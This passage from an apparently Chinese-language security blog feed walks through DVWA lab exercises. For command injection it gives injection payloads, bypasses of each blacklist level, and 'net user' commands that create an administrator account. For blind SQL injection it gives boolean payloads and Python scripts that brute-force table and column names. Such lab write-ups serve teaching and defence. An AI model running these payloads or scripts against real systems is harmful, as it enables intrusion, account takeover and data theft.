src="../img/burpsuite/15.png" alt="burpsuite"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Command Injection</title>
      <link href="/2020/02/25/Command-Injection/"/>
      <url>/2020/02/25/Command-Injection/</url>
      
        <content type="html"><![CDATA[<p>命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>stristr(a, b) 函数的作用是查找 b 字符串在 a 字符串中第一次出现的位置（无视大小写），找到则从匹配点返回 a 剩余的字符串，如果没找到就返回 FALSE</p><p>php_uname(‘s’) 效果类似 UNIX 系统的指令 “uname -s”，返回当前操作系统的名称</p><br/><p>所以下面这句控制语句是在判断当前系统是否为 Windows</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) </span><br></pre></td></tr></table></figure><p>如果是Windows，就直接 ping</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br></pre></td></tr></table></figure><p>否则，就指定参数 “ping -c 4”，意为 ping 4 次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br></pre></td></tr></table></figure><p>漏洞点就在这里，当我们构造 $target 变量为 “<strong>127.0.0.1 | ipconfig</strong>“ 时，整个语句就会变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping 127.0.0.1 | ipconfig&#x27;</span> ); </span><br></pre></td></tr></table></figure><p>相当于只执行 “net user” 指令，下面给出命令连接符（部分） “&amp; &amp;&amp; | || ;” 的区别</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp; command2    // 先执行1，不管是否成功，都会执行2</span><br><span class="line">command1 &amp;&amp; command2   // 先执行1，执行成功后执行2，否则不执行2</span><br><span class="line">command1 | command2    // 只执行2</span><br><span class="line">command1 || command2   // 只执行1</span><br></pre></td></tr></table></figure><p><strong>以上连接符在 Windows, Unix 中都可以使用</strong></p><p><strong>分号只可用在 Unix 中</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command1 ; command2    // 执行1，不管是否成功，都会执行2 </span><br></pre></td></tr></table></figure><p>所以 payload 前面的 “127.0.0.1” 写不写都无所谓了</p><br/><p>之后通过 net user 来提权</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| net user test /add  // 添加一个 test 账户</span><br><span class="line">| net localgroup Administrators test /add  // 将用户加入到Administrators组</span><br><span class="line">| net user test /active:yes  // 激活用户</span><br></pre></td></tr></table></figure><p>以后就可以通过具有管理员权限的 test 用户来控制系统了</p><br/><h2 id="Meduim"><a href="#Meduim" class="headerlink" title="Meduim"></a>Meduim</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这里有了黑名单处理，’&amp;&amp;’ 与 ‘;’ 都会被替换为空字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br></pre></td></tr></table></figure><p>我们还有 ‘&amp; |’ 等可以用，同样可以造成命令执行</p><br/><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line"><span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样是黑名单，不过依然可以绕过，注意到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span> </span><br></pre></td></tr></table></figure><p>此处的 ‘|’ 后面跟了一个空格，那么 payload 就可以通过将后面指令紧贴 ‘|’ 来绕过，如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|net user </span><br></pre></td></tr></table></figure><p>依旧造成了命令注入</p><br/><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><blockquote><p>源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Split the IP into 4 octects</span></span><br><span class="line"><span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check IF each octet is an integer</span></span><br><span class="line"><span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line"><span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Windows</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// *nix</span></span><br><span class="line"><span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里给出了一个解决方案</p><p>首先通过 stripslashes 函数去掉传过来的参数中的反斜杠</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> ); </span><br></pre></td></tr></table></figure><p>然后通过 explode 函数将字符串按小数点拆分，返回一个数组，类似 python 中的 target.split(‘.’)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> ); </span><br></pre></td></tr></table></figure><p>最后检查该数组长度是否为 4，每个元素是否是数字（正常的 ip 形似 192.168.1.1），所以无法再造成命令执行，其搭配了 token 更增加了安全系数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection (Blind)</title>
      <link href="/2020/02/25/SQL-Injection-Blind/"/>
      <url>/2020/02/25/SQL-Injection-Blind/</url>
      
        <content type="html"><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><blockquote><p>分析</p></blockquote><p>当查询返回的值为真时，显示 <strong>User ID exists in the database.</strong></p><p>反之，显示 <strong>User ID is MISSING from the database.</strong></p><p>考虑布尔盲注，同时检查闭合字符串，为字符型注入</p><h3 id="猜解表的数量"><a href="#猜解表的数量" class="headerlink" title="猜解表的数量"></a>猜解表的数量</h3><p>使用二分法先猜解表的数量</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 判断表数小于4，结果为true</span><br><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&lt;4%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断表数大于1，结果为true</span><br><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;1%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断表数等于2，结果为true</span><br><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>故表的数量为 2</p><br/><h3 id="猜解表的名字"><a href="#猜解表的名字" class="headerlink" title="猜解表的名字"></a>猜解表的名字</h3><p>再猜解第一张表的名字（使用ascii+substr逐字猜解）</p><p>将(select table_name from information_schema.tables where table_schema=database() limit 0,1)作为substr的第一个参数（<strong>带上括号</strong>），记作 str_a，其中 limit x,y 返回查询结果从下标 x 开始（<strong>下标从0开始计数</strong>），长度为 y 的记录。</p><p>substr( str_a, x, y ) 表示截取 str_a 从下标 x 开始（<strong>下标从1开始计数</strong>），长度为 y 的字符串作为返回值，这里 substr(str_a, 1, 1) 表示截取查询结果的第一条记录(str_a)的第一个字符出来，ascii函数将其包裹，表示返回第一个字符的 ascii 码，之后对其进行判断。</p><p>tips：可以先通过大于小于来确定区间，再用等于获取准确的 ascii 值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 判断第一个字符ascii大于100，结果为true</span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断第一个字符ascii大于120，结果为false</span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;120%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断第一个字符ascii小于110，结果为true</span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;110%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断第一个字符ascii小于105，结果为true</span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;105%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断第一个字符ascii等于103，结果为true</span><br><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>ascii 码为 103 的字符是 g，于是可以确定第一张表的表名首字母为 g。</p><blockquote><p>使用脚本</p></blockquote><p>为了从手工判断中解脱出来，<strong>使用脚本自动判断</strong>显然是更高效的，我们可以手工爆出表名的长度，然后用脚本逐字爆破</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 判断表名长小于10，结果为true</span><br><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断表名长大于5，结果为true</span><br><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">// 判断表名长等于9，结果为true</span><br><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>得出表长为 9，使用python脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">table1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">127</span>):</span><br><span class="line">u = <span class="string">&quot;http://192.168.249.129/dvwa/vulnerabilities/sqli_blind/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d%%23&amp;Submit=Submit#&quot;</span> % (i, j)</span><br><span class="line">h = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=5sk04vktndkmb5f574o5de8m57; security=low&quot;</span>&#125;</span><br><span class="line">r = requests.get(url=u, headers=h)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;User ID exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table1 += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(table1)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>访问时要携带cookie信息，在浏览器 f12 的存储一栏里即可找到</p><p><img src="../img/SQL-Injection-Blind/1.png" alt="SQL-Injection-Blind"></p><p>同时需要注意，脚本中此处的两个 % 表示转义 %，告诉python将其作为%来处理而不是格式化字符</p><p><img src="../img/SQL-Injection-Blind/2.png" alt="SQL-Injection-Blind"></p><p>运行结果如下</p><p><img src="../img/SQL-Injection-Blind/3.png" alt="SQL-Injection-Blind"></p><p>由此可知第一个表的表名为guestbook</p><p>同理，可确定第二张表的表名长度为5，脚本爆出名字为users（只需修改变量 i 的范围与 limit 1, 1）</p><br><h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>接着就是爆字段名，流程同爆表名一样，先用 count 手动爆出users表的字段数为8</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27; )=8%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>一次性爆破八个表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">columns = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65</span>):    <span class="comment"># mysql字段名长度上限为64</span></span><br><span class="line">flag = <span class="number">0</span>             <span class="comment"># 设置flag位，当一次遍历找不到匹配字符视为该字段名爆破完成</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">127</span>):</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">u = <span 